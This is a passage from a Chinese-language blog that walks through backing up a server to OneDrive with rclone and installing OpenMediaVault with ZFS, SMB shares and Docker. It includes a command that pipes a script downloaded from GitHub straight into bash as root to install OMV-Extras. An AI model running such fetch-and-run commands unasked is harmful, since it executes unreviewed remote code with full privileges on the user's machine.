<h1 id="三、编写同步脚本"><a href="#三、编写同步脚本" class="headerlink" title="三、编写同步脚本"></a>三、编写同步脚本</h1><p>这个脚本也不算麻烦，首先输入下方命令新建同步脚本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim rclone.sh</span><br></pre></td></tr></table></figure>

<p>按Insert键进入编辑模式，粘贴以下三条内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">rclone <span class="built_in">sync</span> /www/backup/database onedrive:bak/database</span><br><span class="line">rclone <span class="built_in">sync</span> /www/backup/site onedrive:bak/site</span><br><span class="line"></span><br><span class="line"><span class="comment">#格式</span></span><br><span class="line">rclone <span class="built_in">sync</span> path/to/backupfolders onedrive:</span><br></pre></td></tr></table></figure>

<p>然后按Esc键退出编辑模式，输入:wq保存并退出。</p>
<p>脚本首行是注释，上面的脚本只包含两条命令，第二行是将&#x2F;www&#x2F;backup&#x2F;database目录及里面的数据库备份文件，同步到OneDrive的bak&#x2F;database文件夹里。第三行是同步网站备份文件。</p>
<p>接着为新建的脚本增加执行权限。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x rclone.sh</span><br></pre></td></tr></table></figure>

<p>设置定时任务</p>
<p>脚本编写成功后，需要设置定时任务来运行脚本，才能完成自动备份。</p>
<p>在设置之前，首先将VPS服务器的时区设置为东八区，与我们的作息相同。如果你是国内的VPS或云服务器通常不需要设置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/zoneinfo/Asia/Chongqing /etc/localtime</span><br></pre></td></tr></table></figure>

<p>输入y确定。</p>
<p>接下来我们设置定时任务，输入下方命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure>

<p>按Insert键进入编辑模式，在尾部添加一行即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">35 1 * * *  /root/rclone.sh &gt;&gt; /root/rclone.log 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>这行内容的意思是，每天凌晨1点35分，运行rclone.sh脚本，将网站和数据库备份文件同步到OneDrive网盘。</p>
<p>然后等到第二天，登录OneDrive盘就能看到备份文件已经同步过来了。</p>
<h1 id="四、创建-OneDrive-API（注册微软开发者E5账户）"><a href="#四、创建-OneDrive-API（注册微软开发者E5账户）" class="headerlink" title="四、创建 OneDrive API（注册微软开发者E5账户）"></a>四、创建 OneDrive API（注册微软开发者E5账户）</h1><p>参考<a href="https://macin.top/posts/75823327/">https://macin.top/posts/75823327/</a></p>
<p>1.获取 client_id</p>
<p>首先访问 <a href="https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/RegisteredApps">Microsoft Azure</a> 应用注册，登录账号后点击应用注册</p>
<p>点击左上角的新注册</p>
<p>如图所示进行配置，名称可以随便写，账户类型选择第三项</p>
<p>点击注册后可以看到你的应用的相关信息，复制好 应用程序 (客户端) ID ，这个就是 client_id</p>
<p>2.获取 client_secret</p>
<p>依次点击证书和密码，新客户端密码，在截止期限中将时间选择为最长（即两年）</p>
<p>然后就可以看见值和机密 ID，我们只需要记录下值就可以</p>
<p>3.添加 API 权限</p>
<p>依次点击 API 权限，添加权限，Microsoft Graph，在右边栏搜索并添加权限。</p>
<p>需要 Files.Read, Files.ReadWrite, Files.Read.All, Files.ReadWrite.All, offline_access, User.Read 这几项</p>
<p>4.添加身份验证</p>
<p>依次点击身份验证，添加平台，Web</p>
<p>在重定向 URI 中输入<code>http://localhost</code></p>
<p>OneDrive API 创建完成。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>onedrive</category>
        <category>rclone</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>onedrive</tag>
        <tag>rclone</tag>
      </tags>
  </entry>
  <entry>
    <title>openmediavault(omv)的安装与配置，说部署zfs文件系统，安装docker</title>
    <url>/posts/5944305b/</url>
    <content><![CDATA[<h1 id="Openmediavault-的安装与配置"><a href="#Openmediavault-的安装与配置" class="headerlink" title="Openmediavault 的安装与配置"></a>Openmediavault 的安装与配置</h1><h2 id="获取系统镜像、制作启动-U-盘"><a href="#获取系统镜像、制作启动-U-盘" class="headerlink" title="获取系统镜像、制作启动 U 盘"></a>获取系统镜像、制作启动 U 盘</h2><p>目前，Openmediavault 有基于 Debian 10 的 5.X 和基于 Debian 11 的 6.X 两个现役的大版本，我们这里选择较新的后者。打开 <a href="https://www.openmediavault.org/download.html">OMV 官方网站的下载页</a>，下载 Stable 版本的 ISO 镜像，完成后用 SHA265 校验一下文件的完整性。我这里镜像的版本是 <code>6.0.24</code>。</p>
<p>使用 rufus 或者类似工具，将 ISO 文件烧入 U 盘。我这里使用 UEFI 启动，分区类型选择 GPT；烧录时会提示选择 ISO 还是 DD 模式，推荐选择速度更快的 DD 模式。</p>
<h2 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h2><p>将服务器插上网线和电源，插入烧好镜像的 U 盘，开机选择 U 盘启动。随后会出现 OMV 的 LOGO 和启动选择项，选择 Install 回车进入安装程序：</p>
<ol>
<li>选择语言：选择中文即可；</li>
<li>选择区域：中国；</li>
<li>选择键盘映射：汉语；</li>
<li>选择网络接口：选择插网线对应的接口；</li>
<li>主机名：默认即可；</li>
<li>域名：默认即可；</li>
<li>root 用户密码和确认：推荐留空以禁用，不建议直接使用 root 用户；</li>
<li>设置初始用户全名和用户名：自定义，我这里取 <code>ceba</code>；</li>
<li>设置初始用户密码和确认：自己设置；</li>
<li>提示多个磁盘驱动器：回车继续；</li>
<li>选择磁盘：选择用于安装系统的磁盘；</li>
<li>分区方案：选“是”，需要自己移动光标；</li>
<li>配置软件包管理器：不要选择“中国”，选择“手动输入信息”；</li>
<li>Debian 仓库镜像主机名：这里推荐清华大学 TUNA，地址是 <code>mirrors.tuna.tsinghua.edu.cn</code>；</li>
<li>Debian 仓库镜像目录：对于清华大学 TUNA 源，默认即可；</li>
<li>HTTP 代理信息：这里不需要，留空；</li>
<li>结束安装进程：回车选择继续，结束。</li>
</ol>
<p>系统会自动重新启动，默认启动项应该会被自动修改为 Openmediavault。启动后会进入 Debian 的登陆界面，上面有提示当前服务器 IP 地址，可以用来访问 Web 管理界面。</p>
<p>PS：安装系统的时候需要外接显示器，但我手头并没有 DP 接口的显示器，只好找了条 DP 转 Type-C 的视频线接到便携屏上。另外，没得采集卡，所以没图。</p>
<h2 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h2><p>打开浏览器，输入机器登陆界面看到的 IP，打开 Web 管理界面的登陆页面。这里也可以尝试输入 <code>openmediavault.local</code>（即之前设置的主机名+域名），如果网络环境合适也可以打开 Web 管理界面。</p>
<p>Web 管理界面的用户名是 <code>admin</code>，初始密码是 <code>openmediavault</code>，’’’不是’’’此前设置的 Debian 用户名和密码。输入用户密码后即可进入系统。</p>
<h3 id="修改管理界面密码"><a href="#修改管理界面密码" class="headerlink" title="修改管理界面密码"></a>修改管理界面密码</h3><p>点击右上角设置图标、“更改密码”，输入新的密码后点击保存。</p>
<h3 id="修改网络配置"><a href="#修改网络配置" class="headerlink" title="修改网络配置"></a>修改网络配置</h3><p>根据我家的网络环境，我需要把 IPv4 地址改为静态地址，并且启用 IPv6。点击左侧“网络”、“接口”，在右侧选中需要修改的接口。</p>
<p>然后点击编辑按钮，进入编辑界面：</p>
<ul>
<li>IPv4：方式改为“静态”，地址、子网掩码、网关根据需要填写；</li>
<li>IPv6：方式改为“自动”。</li>
<li>DNS：根据需要填写，我这里填写网关地址。</li>
</ul>
<p>填写完成后滑倒最下方，点击“保存”。随后页面上方会弹出黄色框，提示需要应用设置，点击右侧对勾图标，勾选“确认”后点击“是”按钮。随后网络配置会立即应用，大概率会卡在“正在应用”界面，需要重新输入地址进入 Web 管理界面。</p>
<p>PS：OMV 的几乎所有配置都需要二次确认应用。请在操作后稍等一会儿，看看会不会弹出黄色提示框。</p>
<h3 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h3><p>点击左侧“系统”、“时间和日期”，在“时区”一栏选择 <code>Asia/Shanghai</code>。点击保存，二次确认应用。</p>
<h3 id="设置自动登出时间"><a href="#设置自动登出时间" class="headerlink" title="设置自动登出时间"></a>设置自动登出时间</h3><p>OMV 默认的自动登出时间是 5 分钟，可以调长一些。点击左侧“系统”、“工作台”，在“自动登出”一栏选择希望的时间，例如 60 分钟。点击保存，二次确认应用。</p>
<h2 id="进阶配置"><a href="#进阶配置" class="headerlink" title="进阶配置"></a>进阶配置</h2><p>之后不少工作需要 ssh 到服务器进行，请准备一个 ssh 客户端。我这里使用 Windows Terminal 通过 Powershell 或者 WSL 登录。</p>
<h3 id="配置-ssh-用户"><a href="#配置-ssh-用户" class="headerlink" title="配置 ssh 用户"></a>配置 ssh 用户</h3><p>要通过 ssh 连接到服务器，需要将用户放入 <code>ssh</code> 用户组才可使用 ssh 登录。</p>
<p>点击左侧“用户”、“用户”，选中安装时创建的初始用户，点击“编辑”图标。</p>
<p>点击“用户组”一行，在 <code>ssh</code> 处打勾，在最下方点击“保存”按钮，二次确认应用修改。</p>
<p>随后就可以尝试用 ssh 登陆了。</p>
<h3 id="通过-ssh-登录"><a href="#通过-ssh-登录" class="headerlink" title="通过 ssh 登录"></a>通过 ssh 登录</h3><p>在终端中，输入下面的命令通过 ssh 登录服务器，其中 <code>&lt;your_user_name&gt;</code> 是初始用户名、<code>&lt;your_nas_ip&gt;</code> 是服务器 IP 地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh &lt;your_user_name&gt;@&lt;your_nas_ip&gt;</span><br></pre></td></tr></table></figure>

<p>通过下面的命令将公钥拷贝到服务器，则可以免密码登录服务器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-copy-id &lt;your_user_name&gt;@&lt;your_nas_ip&gt;</span><br></pre></td></tr></table></figure>

<h3 id="调整-ssh-配置"><a href="#调整-ssh-配置" class="headerlink" title="调整 ssh 配置"></a>调整 ssh 配置</h3><p>点击左侧“服务”、“SSH”，取消“允许 root 登录”、“密码认证”，勾选“公钥认证”，以提升服务器安全性。</p>
<h3 id="配置-OMV-源"><a href="#配置-OMV-源" class="headerlink" title="配置 OMV 源"></a>配置 OMV 源</h3><p>清华大学 TUNA 源提供了 Openmediavault 的镜像，推荐使用它来增快下载速度。</p>
<p>通过 ssh 登录服务器后，执行下面的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入 root 用户</span></span><br><span class="line">sudo su</span><br><span class="line"><span class="comment"># 设置 OMV 软件源环境变量</span></span><br><span class="line">omv-env <span class="built_in">set</span> OMV_APT_REPOSITORY_URL <span class="string">&quot;https://mirrors.tuna.tsinghua.edu.cn/OpenMediaVault/public&quot;</span></span><br><span class="line">omv-env <span class="built_in">set</span> OMV_APT_ALT_REPOSITORY_URL <span class="string">&quot;https://mirrors.tuna.tsinghua.edu.cn/OpenMediaVault/packages&quot;</span></span><br><span class="line">omv-env <span class="built_in">set</span> OMV_APT_KERNEL_BACKPORTS_REPOSITORY_URL <span class="string">&quot;https://mirrors.tuna.tsinghua.edu.cn/debian&quot;</span></span><br><span class="line">omv-env <span class="built_in">set</span> OMV_APT_SECURITY_REPOSITORY_URL <span class="string">&quot;https://mirrors.tuna.tsinghua.edu.cn/debian-security&quot;</span></span><br><span class="line"><span class="comment"># 使环境变量生效</span></span><br><span class="line">omv-salt stage run all</span><br></pre></td></tr></table></figure>

<p>使环境变量生效一步可能会耗费较长的时间（约 2 分钟），请耐心等待。之后可以手动检查 <code>/etc/apt/source.list.d/</code> 目录下的几个文件，看软件源是否成功更改。</p>
<h3 id="安装更新"><a href="#安装更新" class="headerlink" title="安装更新"></a>安装更新</h3><p>点击左侧“系统”、“更新管理”、“更新”，首先点击“检测是否有更新”图标（图案是搜索），然后点击“安装更新”图标（图案是下载）、确认。</p>
<p>当然也可以用命令行完成这些工作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade</span><br></pre></td></tr></table></figure>

<h2 id="安装-OMV-Extras-org"><a href="#安装-OMV-Extras-org" class="headerlink" title="安装 OMV-Extras.org"></a>安装 OMV-Extras.org</h2><p>OMV-Extras.org 是 OMV 的增强插件，后续部署 ZFS 和 Docker 都需要它。</p>
<p>安装 OMV-Extras 需要管理员权限，下面的操作都需要通过 <code>sudo su</code> 命令，在 root 用户下进行。</p>
<h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><p>OMV-Extras 安装需要访问 Github。考虑到我这里的网络环境，需要使用 HTTP 代理来保证安装顺利。</p>
<p>首先，配置好代理服务器，允许局域网连接。</p>
<p>SSH 到服务器，在主目录下新建 <code>proxy.sh</code>，内容如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=&quot;http://&lt;your_proxy_ip&gt;:&lt;your_proxy_port&gt;/&quot;</span><br><span class="line">export https_proxy=&quot;http://&lt;your_proxy_ip&gt;:&lt;your_proxy_port&gt;/&quot;</span><br><span class="line">export ftp_proxy=&quot;http://&lt;your_proxy_ip&gt;:&lt;your_proxy_port&gt;/&quot;</span><br><span class="line">export no_proxy=&quot;127.0.0.1,localhost&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">For curl</span></span><br><span class="line">export HTTP_PROXY=&quot;http://&lt;your_proxy_ip&gt;:&lt;your_proxy_port&gt;/&quot;</span><br><span class="line">export HTTPS_PROXY=&quot;http://&lt;your_proxy_ip&gt;:&lt;your_proxy_port&gt;/&quot;</span><br><span class="line">export FTP_PROXY=&quot;http://&lt;your_proxy_ip&gt;:&lt;your_proxy_port&gt;/&quot;</span><br><span class="line">export NO_PROXY=&quot;127.0.0.1,localhost&quot;</span><br></pre></td></tr></table></figure>

<p>运行下面的命令，让代理生效：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> proxy.sh</span><br></pre></td></tr></table></figure>

<p>然后测试一下代理是否能够正常连接，如果能看到正在连接代理服务器的相关输出，则说明代理正常。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.co</span><br></pre></td></tr></table></figure>

<p>PS：这个方法是用来临时使用代理的，退出登陆后代理设置就失效了。也可以用 OMV 的 Web 管理界面设置代理，但我折腾半天发现没这个方便。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>执行下面的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O - https://github.com/OpenMediaVault-Plugin-Developers/packages/raw/master/install | bash</span><br></pre></td></tr></table></figure>

<p>打开 OMV 的 Web 管理界面，按下 <code>Ctrl + Shift + R</code> 或者 <code>Ctrl + F5</code> 强制刷新页面缓存。然后可以在左侧“系统”菜单下看到“omv-extras”项，说明安装成功。</p>
<p>PS：强制刷新 Web 管理界面是常规操作，能解决很多奇怪问题。</p>
<h3 id="设置-OMV-Extras-的镜像"><a href="#设置-OMV-Extras-的镜像" class="headerlink" title="设置 OMV-Extras 的镜像"></a>设置 OMV-Extras 的镜像</h3><p>OMV-Extras 引入了一些新的软件源，我们同样可以将之换成清华大学 TUNA 源来加快下载速度。</p>
<p>通过 ssh 登录服务器后，执行下面的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入 root 用户</span></span><br><span class="line">sudo su</span><br><span class="line"><span class="comment"># 设置 OMV 软件源环境变量</span></span><br><span class="line">omv-env <span class="built_in">set</span> OMV_EXTRAS_APT_REPOSITORY_URL <span class="string">&quot;https://mirrors.tuna.tsinghua.edu.cn/OpenMediaVault/openmediavault-plugin-developers&quot;</span></span><br><span class="line">omv-env <span class="built_in">set</span> OMV_DOCKER_APT_REPOSITORY_URL <span class="string">&quot;https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian&quot;</span></span><br><span class="line">omv-env <span class="built_in">set</span> OMV_PROXMOX_APT_REPOSITORY_URL <span class="string">&quot;https://mirrors.tuna.tsinghua.edu.cn/proxmox/debian&quot;</span></span><br><span class="line"><span class="comment"># 使环境变量生效</span></span><br><span class="line">omv-salt stage run all</span><br></pre></td></tr></table></figure>

<p>和之前相同，使环境变量生效一步可能会耗费较长的时间（约 2 分钟），请耐心等待。同样可以手动检查 <code>/etc/apt/source.list.d/</code> 目录下的几个文件，看软件源是否成功更改。</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>OK，OMV 的基本安装和配置算是告一段落了，可以说是非常麻烦。接下来，我会在 OMV 上部署 ZFS 文件系统，然后用 Docker 部署 qBittorrent，让 NAS 正式工作起来。</p>
<h1 id="Openmediavault-部署-ZFS-文件系统"><a href="#Openmediavault-部署-ZFS-文件系统" class="headerlink" title="Openmediavault 部署 ZFS 文件系统"></a>Openmediavault 部署 ZFS 文件系统</h1><h2 id="替换-Proxmox-内核"><a href="#替换-Proxmox-内核" class="headerlink" title="替换 Proxmox 内核"></a>替换 Proxmox 内核</h2><p>Proxmox 内核（即 pve 内核）对 ZFS 文件系统的支持要更好。要使用 ZFS 文件系统，首先需要将 Debian 内核替换为 Proxmox 内核。</p>
<p>PS：踩的坑之一，不换 Proxmox 内核，ZFS 跑不起来……</p>
<h3 id="安装-openmediavault-kernel-插件"><a href="#安装-openmediavault-kernel-插件" class="headerlink" title="安装 openmediavault-kernel 插件"></a>安装 openmediavault-kernel 插件</h3><p>登录 OMV 的 Web 管理界面，点击左侧“系统”、“插件”，在右侧搜索“proxmox”即可找到 openmediavault-kernel 插件。选中 openmediavault-kernel，点击“安装”按钮，确认安装。</p>
<p>安装完成后，按下 <code>Ctrl + Shift + R</code> 或者 <code>Ctrl + F5</code> 强制刷新页面缓存，然后可以在左侧“系统”菜单下看到“内核”项。</p>
<h3 id="安装-Proxmox-内核"><a href="#安装-Proxmox-内核" class="headerlink" title="安装 Proxmox 内核"></a>安装 Proxmox 内核</h3><p>点击左侧“系统”、“内核”，点击右侧“Proxmox”图标，选择“安装 Proxmox 内核”一项，开始安装进程。</p>
<p>安装完成后，刷新页面，可以看到 pve 内核已是默认。</p>
<p>点击右上角电源图标，重启系统。如果能够正常进入系统，就可以移除常规内核了。</p>
<h3 id="清理其他内核"><a href="#清理其他内核" class="headerlink" title="清理其他内核"></a>清理其他内核</h3><p>点击左侧“系统”、“内核”，点击右侧“Proxmox”图标，选择“移除非 Proxmox 内核”一项，开始清理其他内核。</p>
<p>刷新页面后，可看到只有 pve 内核了。这里可以考虑再重启系统一次。</p>
<h2 id="安装-ZFS-文件系统支持"><a href="#安装-ZFS-文件系统支持" class="headerlink" title="安装 ZFS 文件系统支持"></a>安装 ZFS 文件系统支持</h2><h3 id="禁用-backports-源"><a href="#禁用-backports-源" class="headerlink" title="禁用 backports 源"></a>禁用 backports 源</h3><p>PS：踩的坑之二，不禁用 backports 源，ZFS 装不上……</p>
<p>点击左侧“系统”、“omv-extras”、“设置”，取消勾选“Backports”选项，点击保存，二次确认应用。</p>
<h3 id="安装-openmediavault-zfs-插件"><a href="#安装-openmediavault-zfs-插件" class="headerlink" title="安装 openmediavault-zfs 插件"></a>安装 openmediavault-zfs 插件</h3><p>点击左侧“系统”、“插件“，在右侧搜索“zfs”即可找到 openmediavault-zfs 插件。选中 openmediavault-zfs，点击“安装”按钮，确认安装。</p>
<p>安装完成后，按下 <code>Ctrl + Shift + R</code> 或者 <code>Ctrl + F5</code> 强制刷新页面缓存，然后可以在左侧“存储器”菜单下看到“zfs”项。</p>
<h2 id="创建-ZFS-存储池、数据集"><a href="#创建-ZFS-存储池、数据集" class="headerlink" title="创建 ZFS 存储池、数据集"></a>创建 ZFS 存储池、数据集</h2><p>ZFS 文件系统中，有存储池、数据集、卷等概念。存储池是一组磁盘构成的逻辑卷，多个磁盘组成软 RAID 阵列；数据集则相当于存储池的一个子文件夹，可更改的选项会比存储池更多，通常用它来存储数据。</p>
<h3 id="擦除硬盘"><a href="#擦除硬盘" class="headerlink" title="擦除硬盘"></a>擦除硬盘</h3><p>创建存储池前需要先将磁盘擦除。登录 OMV 的 Web 管理界面，点击左侧“存储器”、“磁盘”，选中需要擦除的硬盘，点击“擦除”图标，二次确认擦除，选择“快速”模式即可。</p>
<p>重复上述步骤，将所有要放入 ZFS 存储池的磁盘都擦除。</p>
<h3 id="创建存储池"><a href="#创建存储池" class="headerlink" title="创建存储池"></a>创建存储池</h3><p>点击左侧“存储器”、“zfs”、“池”，点击加号图标，选择“添加池”一项，进入创建存储池页面。</p>
<p>在创建存储池页面：</p>
<ul>
<li>名称：存储池的名称，根据个人喜好，我这里叫 <code>main</code>；</li>
<li>池类型：RAID 类型，通常根据磁盘数量选择，磁盘应当是同品牌、同型号、同大小的。我这里只有 2 块盘，所以选择“镜像”；</li>
<li>设备：勾选上一步中擦除过的设备；</li>
<li>挂载点：可以留空，系统会自动设置，也可以根据习惯自行设置；</li>
<li>设备别名：“以 ID”，不要改；</li>
<li>强制创建：磁盘大小不同时才需要，这里不勾选；</li>
<li>设置ashift：注释都说了不要改；</li>
<li>压缩：可以勾上，压缩类型选默认的“zf4”就好，不会占用太多资源。</li>
</ul>
<p>点击“保存”按钮创建存储池，二次确认应用设置。可以看到存储池已经在列表中了，挂载点是 <code>/main</code>，可以用命令行访问这个目录看看。</p>
<h3 id="创建数据集"><a href="#创建数据集" class="headerlink" title="创建数据集"></a>创建数据集</h3><p>OMV 里面，ZFS 的数据集被称作“文件系统”。点击左侧“存储器”、“zfs”、“池”，勾选刚刚创建的存储池，点击加号图标，选择“添加文件系统快照卷”选项。</p>
<p>PS：这里的“添加文件系统快照卷”指的是“添加文件系统、快照、卷”，并不存在某个东西叫“文件系统快照卷”……</p>
<p>在弹出的对话框里：</p>
<ul>
<li>类型：选择“文件系统”，即数据集；</li>
<li>前缀：存储池的名称，不需要修改；</li>
<li>名称：根据需要起名，我这里叫 <code>test</code>；</li>
<li>挂载点：同样可以留空。</li>
</ul>
<p>点击“保存”按钮创建数据集，二次确认应用设置。可以看到数据卷已经在列表中了，挂载点是 <code>/main/test</code>，可以用命令行访问这个目录看看。</p>
<h2 id="设置共享"><a href="#设置共享" class="headerlink" title="设置共享"></a>设置共享</h2><p>设置好共享后，就可以在局域网内访问 NAS 上的存储空间了。我的主力机器是 Windows 的，这里主要介绍 SMB 协议的共享。</p>
<h3 id="调整存储池-ACL-设置"><a href="#调整存储池-ACL-设置" class="headerlink" title="调整存储池 ACL 设置"></a>调整存储池 ACL 设置</h3><p>ZFS 插件默认禁用了 ACL 权限控制，这会对之后共享文件夹的设置产生一定的影响，需要手动开启。</p>
<p>点击左侧“存储器”、“zfs”、“池”，选中之前创建的存储池，点击“特性”图标，进入特性页面。修改以下几个参数：</p>
<ul>
<li>aclmode：改为 <code>groupmask</code>；</li>
<li>aclinherit：确认为 <code>restricted</code>；</li>
<li>acltype：改为 <code>posix</code>。</li>
</ul>
<p>上面这些修改都需要先选中修改项，再到上方点击“编辑”按钮，然后再手动输入值，保存。</p>
<h3 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h3><p>为了访问共享文件，我们需要创建一个新用户。点击左侧“用户”、“用户”，点击“新建|导入”图标，选择“创建”项。填入以下信息：</p>
<ul>
<li>用户名：自己选择一个用户名，这里使用 <code>asdf</code>；</li>
<li>密码：自己选择一个密码；</li>
<li>用户组：留空即可，系统会自动加入 <code>users</code> 用户组。</li>
</ul>
<p>点击保存，二次确认应用，即可看到新建的用户出现在列表之中。</p>
<h3 id="设置共享文件夹和权限"><a href="#设置共享文件夹和权限" class="headerlink" title="设置共享文件夹和权限"></a>设置共享文件夹和权限</h3><p>点击左侧“存储器”、“共享文件夹”，点击“创建”图标。</p>
<p>在打开的页面中，设置如下参数：</p>
<ul>
<li>名称：共享文件夹的名称，可以和数据集保持一致；</li>
<li>文件系统：选择之前创建的数据集；</li>
<li>相对路径：选择共享文件夹本身，显示出来应当是 <code>/</code>；</li>
<li>权限：默认即可，或根据自己需要修改；</li>
</ul>
<p>点击保存，二次确认应用，即可看到创建的共享文件夹出现于列表之中。</p>
<p>选中刚刚创建的共享文件夹，点击“访问控制列表”按钮，在进入的页面中：</p>
<ul>
<li>找到刚刚创建的 <code>asdf</code> 用户，将之权限改为“读&#x2F;写”；</li>
<li>将下方的所有者从root改为admin；<ul>
<li>OMV 其他文件系统默认的所有者即是 <code>admin</code>，推荐手动调整一下；</li>
</ul>
</li>
<li>将用户组的权限改为“读&#x2F;写&#x2F;执行”；</li>
<li>勾选下方的“取代”和“递归”选项。</li>
</ul>
<p>点击保存即可。</p>
<h3 id="设置-SMB-共享"><a href="#设置-SMB-共享" class="headerlink" title="设置 SMB 共享"></a>设置 SMB 共享</h3><p>点击左侧“服务”、“SMB”、“设置”，勾选“已启动”项。点击下方保存，二次确认应用，即可打开 SMB 服务。</p>
<p>点击左侧“服务”、“SMB”、“共享”，点击“创建”按钮，设置如下项：</p>
<ul>
<li>共享文件夹：选择刚才创建的共享文件夹；</li>
<li>公开：选择“否”或者“允许访客”均可；</li>
<li>勾选“继承ACL”、“继承权限”。</li>
</ul>
<p>点击保存，二次确认应用，SMB 设置就 OK 了。</p>
<h3 id="连接和测试"><a href="#连接和测试" class="headerlink" title="连接和测试"></a>连接和测试</h3><p>在本地机器上，打开 Windows 资源管理器，通过以下两种方法之一访问：</p>
<ul>
<li>打开“网络”文件夹，找到“OPENMEDIAVAULT”（安装时设置的主机名）项目，双击进入；</li>
<li>在地址栏中输入 <code>\\&lt;your_nas_ip&gt;</code>（两个反斜杠 + IP地址），按回车进入。</li>
</ul>
<p>随后会弹出窗口请求用户名和密码，输入此前创建的用户即可登录。</p>
<p>尝试复制文件到 NAS，或者从 NAS 复制文件，速度能够基本跑满千兆以太网。</p>
<h2 id="结语-1"><a href="#结语-1" class="headerlink" title="结语"></a>结语</h2><p>到这一步，NAS 算是达到一个可用的状态了，同样是非常麻烦。部署 ZFS 文件系统踩了巨大多的坑。</p>
<h1 id="Openmediavault-通过-Docker-部署-qBittorrent"><a href="#Openmediavault-通过-Docker-部署-qBittorrent" class="headerlink" title="Openmediavault 通过 Docker 部署 qBittorrent"></a>Openmediavault 通过 Docker 部署 qBittorrent</h1><h2 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h2><p>点击左侧“系统”、“omv-extras”、“Docker”，点击“安装”按钮，开始安装进程。安装完成后，回到同一界面，应该能看到提示状态是“已安装、运行中”，版本号应当不低于 20.10.17。</p>
<p>如果发现版本号低于 20.10.17，请点击“移除”按钮，移除当前版本的 Docker。使用 ssh 连接到服务器，运行下面的命令安装 Docker：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>

<h3 id="Docker-Hub-镜像加速"><a href="#Docker-Hub-镜像加速" class="headerlink" title="Docker Hub 镜像加速"></a>Docker Hub 镜像加速</h3><p>推荐添加阿里云、中国科大的容器镜像，以加快 Docker Hub 上的镜像拉取速度。编辑 <code>/etc/docker/daemon.json</code> 这个文件，在其中添加如下一项：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;https://ustc-edu-cn.mirror.aliyuncs.com/&quot;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<p>修改后的文件形如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;data-root&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/var/lib/docker&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;https://ustc-edu-cn.mirror.aliyuncs.com/&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后重启 Docker 服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure>

<h3 id="踩到的坑与捉到的虫"><a href="#踩到的坑与捉到的虫" class="headerlink" title="踩到的坑与捉到的虫"></a>踩到的坑与捉到的虫</h3><blockquote>
<p>这段内容可以略过:)</p>
</blockquote>
<p>我当初用上面的办法安装好 Docker 之后，发现我没有办法启动任何 Docker 容器，会报如下错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ceba@openmediavault:~$ sudo docker start portainer</span><br><span class="line">Error response from daemon: AppArmor enabled on system but the docker-default profile could not be loaded: running `apparmor_parser apparmor_parser --version` failed with output:</span><br><span class="line">error: <span class="built_in">exec</span>: <span class="string">&quot;apparmor_parser&quot;</span>: executable file not found <span class="keyword">in</span> <span class="variable">$PATH</span></span><br><span class="line">Error: failed to start containers: portainer</span><br></pre></td></tr></table></figure>

<p>我寻找了许多材料、尝试了许多办法来解决这个问题，包括缺少安装 apparmor，但都无济于事。后来找到了<a href="https://forum.openmediavault.org/index.php?thread/43606-can-t-run-docker-containers-after-upgrade-to-v6-apparmor-missing/">这篇帖子</a>，发现到我通过 OMV-Extras 插件安装的是一个巨大古老的 Docker 版本（v20.10.5）。于是根据帖子提示，手动执行了安装命令，终于解决了这一问题。</p>
